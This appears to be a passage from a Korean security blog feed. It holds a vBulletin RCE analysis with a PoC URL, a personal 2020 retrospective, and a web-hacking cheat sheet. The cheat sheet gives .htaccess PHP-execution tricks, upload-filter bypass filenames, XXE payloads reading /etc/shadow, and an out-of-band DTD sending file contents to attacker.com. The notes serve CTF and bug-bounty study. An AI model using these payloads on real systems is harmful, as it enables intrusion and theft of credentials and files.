</span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p><strong>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</strong><br></p><p><strong>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</strong><br></p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><strong><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</strong><br><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><strong>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</strong><br></p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a><em>CVE-2020-7373 Patch</em></h2><p><strong>패치 코드가 안 보임</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> 0-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 회고와 2021 계획</title>
      <link href="2021/01/18/2021-01-18-new-year/"/>
      <url>2021/01/18/2021-01-18-new-year/</url>
      
        <content type="html"><![CDATA[<p><strong>페이스북을 들어가보니 티오리에서 회고록을 쓴 것을 읽어보았습니다. 글을 읽고 저도 처음으로 회고록과 앞으로의 계획들을 써봐야겠다고 생각이 들었습니다.</strong></p><hr><h2 id="2020년-회고"><a href="#2020년-회고" class="headerlink" title="2020년 회고"></a>2020년 회고<br></h2><p><span style="color:#21C587">#</span> January ~ March<br></p><p><strong>2020년에는 여태 살아왔던 해를 비교해서 제일 열심히 살았고, 많은 성장을 했던 해인 거 같습니다. 처음에는 솔직히 “내가 이것을 잘 할 수 있을 까?”라는 의심을 가지며 시작했지만 하루 하루가 지나며 다행히도 의심은 사라졌고, 그 의심이 더 힘이 되어준 거 같습니다. 그리고 1월부터 3월까지 통틀어서 제일 다행과 동시에 좋았던 것은 좋은 사람을 만났던 것 입니다. 야미라는 갓님과 첫 약속을 친구와 함께 어느 술집에서 시작해서 지금까지 지내오고, 또 떡볶이좋아라는 형님도 학교 선배인 것을 알게 되어, 학교를 입학하기 전에 만나서 밥을 먹으며 이런 저런 이야기를 나누었습니다. (물론 술집에서) 이렇게 1월부터 3월은 좋은 사람들을 만나며 아주 좋은 시작을 했습니다. </strong><br></p><p><span style="color:#21C587">#</span> April ~ June<br></p><p><strong>그렇게 코로나와 함께 3월까지 개인 공부를 하다가 4월 쯤에 학교를 첫 입학하게 되었습니다. 우리 학교만 이상하게 코로나인데도 4월에 입학을 했다는 거에 매우 불만이였지만, 처음으로 학교를 간 날 기적 같은 일이 일어났습니다. 이날 학교를 마치고 부대찌게 집에서 친구와 Jsec님(학교 선배)과 함께 밥을 먹으면서 이런 저런 이야기를 하며 친해졌고, Jsec님에게 여러가지 질문을 하며 보안 공부를 했었습니다. 그리고 4월인가 비가 올 때 쯤에 Jsec님이 강남 **빌딩에서 강의를 한다고 저보고 와서 들으라고 하셔서 가서 CTF 문제 풀이 강의를 듣게 되었는데, 이때 너무 많은 것들을 배우고, 또 이 날 CTF의 첫 눈을 떠버렸었습니다. 이 날 이후로 CTFTIME을 통해 여러가지 CTF 대회들을 참여하기 시작했었습니다.</strong><br></p><p><span style="color:#21C587">#</span> July ~ September<br></p><p><strong>7월에는 학교 기말고사가 끝나고, 학교를 계속 다닐 지 그만 다닐 지 고민을 잠시 했었습니다. 학교에서 배우면 시간적으로 너무 아깝고, 또 딥하게 배우는 데는 그냥 혼자하는 게 더 좋을 거 같다는 생각이 들어서 결국 자퇴하고, 무작정 취업 준비로 들어갔습니다. 이때 자만감의 취해 회사를 지원하면 어디든 붙겠지~ 라는 생각으로 지원을 했습니다. 그런데 아니나 다를 까 처음 지원한 회사에 바로 붙어 첫 면접을 준비했던 것 입니다. 타이거팀이라는 기업인데 여튼 뭐 면접에서 불합격을 받으며 제 자신의 위치를 다시 확인하는 좋은 경험이였습니다. 그리고 9월에는 김종민멘토님께 연락을 해 대외 활동 관련해서 이야기를 하다가 갓멘토님께서 보안팀 하나를 추천해주셔서 N0Named라는 보안팀의 인턴으로 들어가게 되었습니다.</strong><br></p><p><span style="color:#21C587">#</span> October ~ December<br></p><p><strong>10월, 11월에는 지니온, 시큐어루트라는 회사에 1차 서류를 합격해서 면접을 보게 되었습니다! 과연 결과는….? 광탈! 이때는 정말 면접을 잘 봤다고 생각을 했는데 면접관님께서는 그렇게 안 보이셨나 봅니다. 여튼 이렇게 후반부에 2개의 회사에 불합격을 받아 다시 한 번 충격을 받고, N0Named 보안팀의 인턴 활동을 더 열심히 했었습니다. 하지만 개인적인 집안 사정 때문에 12월에 한 번 더 내부 세미나를 참석하지 못 해 인턴에서 2쿠를 당하고, 집안 일을 도우며 12월을 보냈고, 중간에 또 좋은 분을 만나서 SUA의 운영진으로 들어가 활동하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> Bug Bounty<br></p><p><strong>2020년 12월 22일에 해커원이라는 플랫폼에서 특정 사이트를 선정해 버그바운티를 진행했습니다.  이날 정말 운 좋게 Reflected XSS를 발견했습니다! 흑흑 하지만 해당 취약점은 self xss이기 때문에 시나리오를 작성해 공격을 연계해는 게 쉽지 않아 결국 바운티를 받지 못 했습니다. 아닛 로그인 기능도 없어 세션 탈취도 못 하고,, 너무 아쉬웠지만 버그바운티를 하며 처음으로 재미를 느꼈기 때문에 나쁘지는 않았습니다. 아마 바운티를 받았다면 이거 보다 몇 억배는 행복할 거 같았는데 여튼 아쉬웠습니다.</strong><br></p><p><span style="color:#21C587">#</span> CTF<br></p><p><strong>2020년 4월쯤에 Jsec 님의 Pico CTF 강의를 직관으로 보고, 듣고 하면서 첫 CTF의 눈을 뜨게 되었습니다. 이때는 보안을 시작한 지 한 달 정도 됐던 때라서 CTF를 처음 접해보았습니다. 그러다가 CTFTIME이라는 플랫폼을 알게 되었고, 해당 플랫폼을 통해서 CTF 대회를 출전하게 되었습니다. 물론 수상을 하지 못 할 것은 알지만 그래도 여러가지 배경지식을 쌓기 위해서 개인 공부를 하고, CTF를 혼자 참여를 쭉 해오고 있습니다. CTF를 한 3개월 정도 쭉 나가보니 조금씩 배경 지식과 기술들이 쌓이기 시작해서 쉬운 문제들은 20분 안에, 중간 난이도들은 그래도 3시간 안에는 풀리는 거 같습니다. 또 이렇게 CTF를 나가면서 많이 느낀 건데 저는 전에 한 번 봤던 유형이 아니면 매우 어려움을 겪고 문제를 풀지 못 한다는 것을 느꼈습니다. 연구쪽으로 가고 싶은데 이런 부분에서 많이 약하기 때문에 더 많은 노력을 해야 할 거 같습니다. 그리고 요즘들어서는 가끔 사람들과 같이 대회를 나가고 있고, 1년만 더 노력해서 꼭 한국 대회에서 본선 진출만이라도 하려고 노력하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> BOB<br></p><p><strong>이번 6월인가 7월쯤에 BOB 서류를 지원했었습니다. 당시에 지원 서류를 작성할 때는 겸손을 100으로 작성을 하였습니다. 정말 아무 것도 모르지만, 이런 이런 생각을 가지고 있고, 보안을 시작하게 된 이유와 앞으로 이러이러하게 할 계획을 가지고 있다는 식으로 작성을 했었습니다. 당시에는 이게 왜 떨어진 지 몰랐지만 지금 생각해보면 너무 겸손했던 것이 제일 문제점이였던 거 같습니다. 물론 자랑할 실력도 아니고, 자랑할 것도 없지만 공부를 한 지 1주일도 안 된 초등학생 느낌으로 글을 작성해버려서.. 여하튼 이번 년도에 회사를 다니지 않고 있다면 지원서를 조금 더 상세히 작성해서 지원을 할 생각입니다.</strong><br></p><hr><h2 id="2021-회고"><a href="#2021-회고" class="headerlink" title="2021 회고"></a>2021 회고<br></h2><p><span style="color:#21C587">#</span> January 1 ~ 18<br></p><p><strong>2021년 1월 7일에는 재검을 받고, 사회 복무 요원을 받아버렸습니다~ 제일 잘 한 일~ 이렇게 재검을 받고, 사회 복무 요원을 뽑는 모의해킹 회사를 찾아 지원을 했습니다. 운 좋게 한 시큐리티라는 회사에 1차 서류 합격을 받았고, 현재는 면접 날짜를 다시 정해준다고 기다리고 있는 상태입니다. 그리고 또 오펜시브 시큐리티인 디펜스라는 보안 기업에도 서류를 넣었는데,,, 운 좋게 여기도 서류가 붙어버렸습니다. 오펜시브 시큐리티를 가고 싶었는데 이렇게 디펜스라는 기업에 서류를 붙게 돼 좋은 기회를 얻었고, 면접은 1월 21일에 보기로 했습니다. 하지만 해당 기업은 사회 복무 요원으로 채용을 하고 있지 않기 때문에 해당 기업을 나오게 되면 다시 사회 복무 요원을 채용하는 회사로 가야 해서 조금 고민이긴 합니다만 하임시큐리티라는 기업도 병특을 진행하고 있어 디펜스에서 실력을 많이 늘린다면 추 후에 사복요를 하임에서 할 수 있지 않을 까?라는 생각으로 디펜스를 노려보기로 했습니다.</strong><br></p><p><span style="color:#21C587">#</span> Diffense nterview<br></p><p><strong>2021년 1월 21일에 오펜시브 시큐리티인 디펜스에서 면접을 보았습니다. 보안 공부를 하면서 면접을 몇 곳 봐왔지만 이번 면접을 통해서는 매우 많은 것을 느낀 면접이였습니다. 앞 전에 본 면접들은 신입을 뽑아서인 지 면접 난이도도 많이 쉬웠는데, 디펜스 연구원 면접은 평소에 생각해 보지 못 했던 질문들을 받아 많이 당황하였습니다. 하지만 해당 면접은 제가 평소에 늘 원하던 면접 중 하나였습니다. 학벌을 보지 않고, 오로지 내가 무엇을 했고, 어떤 것들을 제보 했으며, 만약 제보를 못 했다면 왜 못 했는 지? 또한 자기가 공부하는 분야에서는 몇 등 안에 드는 지?와 같은 질문들을 받았습니다. 이런 질문에 답을 하는 저를 보며 아직 매우 부족하다는 것을 깨닫았습니다. 앞 전에 본 면접들은 모두 내가 학사, 군대 문제 때문에 떨어졌겠지 라는 생각이 들 정도로 면접 퀄이 좋지 않았는데, 이번에는 개인적으로 면접이 너무 좋았던 거 같습니다. 1년 동안 공부를 더 열심히 해서 내년에 디펜스에 꼭 들어갈 멋진 분들과 함께 연구를 하며 성장할 수 있도록 할 계획입니다. 이번 기회로 처음으로 하나의 기업을 목표로 다시 공부하게 되어 매우 좋습니다. 아 그리고 앞 전에는 모두 면접을 보면서 자기 소개 하라는 거 자체가 이해가 안 갔는데 정말 스타트 업 중에서 좋은 회사는 자기 소개 따윈하지 않는 거 같습니다 ^-^ 물론 다른 기업은 면접을 보지 않아 쓸데 없는 자소를 하는 곳도 많겠지만요.</strong><br></p><hr><h2 id="2021-계획"><a href="#2021-계획" class="headerlink" title="2021 계획"></a>2021 계획<br></h2><p><strong>이제 남은 2021년을 어떻게 이용하냐… 저는 CVE ID 획득, CTF 본선 진출을 목표로 지금보다 더 열심히 공부하며 달려나가 보려고 합니다. 2020년도 많이 뿌듯했지만 2021년은 2020년보다 더 뿌듯한 해가 돼야 하기 때문에 더 빡세게 구르며 살아보려고 합니다. 결론은 공익 공익 공익 만만세!</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> NewYear </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewYear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Note (Update 2021.03.08)</title>
      <link href="2021/01/15/2021-01-15-note/"/>
      <url>2021/01/15/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<p><strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong></p><hr><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.detect_unicode 1</span><br><span class="line">php_value display_errors 1</span><br></pre></td></tr></table></figure><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title=" SQL Injection"></a><span style="color:#21C587"></span> SQL Injection<br></h2><p><code>undefined</code></p><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> OOB XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/poc.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// http://ip/poc.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?collect=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat 